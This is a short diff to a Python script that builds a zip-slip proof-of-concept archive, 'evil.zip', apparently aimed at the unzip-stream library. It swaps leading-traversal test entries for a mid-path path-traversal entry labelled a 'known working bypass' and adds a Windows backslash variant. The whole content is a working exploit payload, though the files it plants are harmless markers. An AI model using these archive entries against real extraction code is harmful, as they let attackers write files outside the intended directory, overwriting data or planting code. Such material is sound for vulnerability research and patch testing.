@@ -1,8 +1,7 @@
 import zipfile
 with zipfile.ZipFile('evil.zip', 'w') as z:
-    # leading traversal (known-stripped by unzip-stream) - control group
-    z.writestr('../ZIPSLIP-PROOF.txt', 'POISONED-LEADING-STRIPPED')
-    # mid-path traversal (bypass candidate: leading-only regex miss)
-    z.writestr('d/../../ZIPSLIP-PROOF-4.txt', 'POISONED-MIDPATH-ESCAPED')
-    z.writestr('d/../../../ZIPSLIP-PROOF-5.txt', 'POISONED-MIDPATH-LEVEL2')
+    # linux mid-path (known working bypass)
+    z.writestr('d/../../ESCAPED-LINUX.txt', 'POISONED-MIDPATH-FORWARD-SLASH')
+    # windows backslash mid-path (entry separators are backslashes)
+    z.writestr('w\\..\\..\\ESCAPED-WIN.txt', 'POISONED-MIDPATH-BACKSLASH')
 print('zip written')
